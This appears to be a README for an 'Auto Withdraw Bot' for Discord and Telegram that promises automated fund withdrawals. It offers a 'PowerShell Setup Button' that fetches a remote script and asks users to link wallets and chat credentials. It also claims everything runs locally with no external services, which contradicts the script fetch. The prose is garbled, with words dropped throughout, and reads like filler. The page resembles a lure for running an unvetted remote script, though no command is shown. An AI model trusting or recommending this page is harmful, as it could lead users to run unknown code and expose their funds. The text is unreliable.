text:
🤝 Auto Withdraw Bot — Friendly, Community-Driven Toolkit for Discord & Telegram

 

 ⚡ PowerShell Setup Button

 

 

 

---

Auto Withdraw Bot is a community-built desktop companion that keeps your withdrawal workflows moving the busywork, shaped by feedback from the people who use it every day. It packs a rich set of features into a friendly, approachable package, so both newcomers and longtime tinkerers can jump right in. Everything locally on your own machine, with no accounts juggle and no external services in the loop. Whether you're streamlining a routine or exploring what the bot can do, you'll find plenty of room make it your own.

 ✅ Before You Start

- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
- Windows 10 / 11 (x64)
- Internet connection — required to fetch the script
- Administrator — not required

 Features

 Fully open-source and community-maintained — every line is transparent, auditable, and shaped by the people who actually use it, with no paywalls and no locked tiers.
- Both Discord and Telegram under one roof — a single, unified experience across your two favorite chat platforms, so your community stays connected no matter where they hang out.
- Hands-off auto-withdraw workflows — set your schedule once and let the bot handle recurring withdrawals quietly in the background while you focus on your community.
- Granular per-server and per-channel controls — fine-tune who can trigger what, where, and how often, with sensible defaults that just work out of the box.
- Live status feedback and logs — friendly, readable updates on every action so you're never left guessing what the bot is doing.
- Modular enhancement layer — optional booster modules let you extend behavior, add quality-of-life modifiers, and tailor advanced your workflow.
- Lightweight footprint, snappy responses — built feel instant even on busy servers, with thoughtful rate limiting so nobody gets spammy.
- Beginner-friendly onboarding — clear, step-by-step guidance and example configs mean you can be up and running in minutes.
- Community-driven roadmap — feature requests, bug reports, and pull requests are all welcome; the project grows in the direction its users ask for.
- Actively maintained — regular updates, honest changelogs, and a friendly team that actually responds when you need a hand.
- Accessible everyone — no subscriptions, no hidden costs, and no gatekeeping; just an open tool built for the community, by the community.

 Commands

Every action in Auto Withdraw Bot is a simple slash command, and we've grouped them so you can find what you need fast. Whether you're just setting up your first withdrawal or fine-tuning a routine that while you're away, there's a command for it. /help any time see this list right inside your chat, and remember that most commands accept optional parameters for extra flexibility.

 Getting Started
- /start — Wake the bot up, register your account, and get a friendly walkthrough of the basics.
- /link — Connect your wallet or account so the bot knows where send your funds.
- /status — Check your current connection state, balance, and any pending operations at a glance.
- /help — Show the command reference, neatly organized by category.

 Withdrawals
- /withdraw — Queue a single withdrawal; specify amount and destination, then confirm.
- /auto — Turn automatic withdrawals on or off, with your own threshold and schedule.
- /schedule — Set recurring withdrawal windows (daily, weekly, or custom intervals).
- /limits — View or adjust your personal minimum, maximum, and cooldown settings.
- /history — Pull a readable log of past withdrawals, complete with timestamps and statuses.
- /cancel — Stop a queued withdrawal before it executes.
- /retry — Re-attempt a withdrawal that didn't go through the first time.

 & Rules
- /rule — Create a conditional rule (for example, withdraw once your balance crosses a level you choose).
- /rules — List every rule you've configured, with a quick toggle for each.
- /pause — Pause all instantly losing your settings.
- /resume — Bring your back online exactly where it left off.

 Insights & Utilities
- /stats — See totals, averages, and trends across your withdrawal activity.
- /export — Download your history as a clean file for your own records.
- /ping — Check that the bot is responsive and see current latency.
- /preferences — Adjust notifications, confirmations, and language suit your workflow.

 Community Favorites
- /tip — Send a small thank-you another member who helped you out.
- /leaderboard — See the most active community members and their streaks.
- /feedback — Share ideas or report a snag directly with the maintainers.

Commands are available everyone out of the box — our goal is keep the whole toolkit accessible and open the community, with no paywalls between you and the features you rely on. New commands land regularly based on what you ask for, so if something's missing, /feedback is the place say it.

 Configuration

Getting Auto Withdraw Bot dialed in for your server is where the fun really begins — and the good news is that it's built be approachable from day one. Whether you're running a cozy community or a bustling hub, the configuration layer is designed be open and accessible everyone, with sensible defaults that work right out of the box and plenty of room make it your own.

The bot ships with a friendly flow that walks you through the essentials: connecting your Discord or Telegram credentials, choosing your preferred withdrawal cadence, and setting the thresholds that matter your community. Everything is stored in a clean, readable config file, so you can tweak values by hand or let the guided wizard handle the heavy lifting. No obscure flags, no hidden gotchas — just clear options with helpful inline notes.
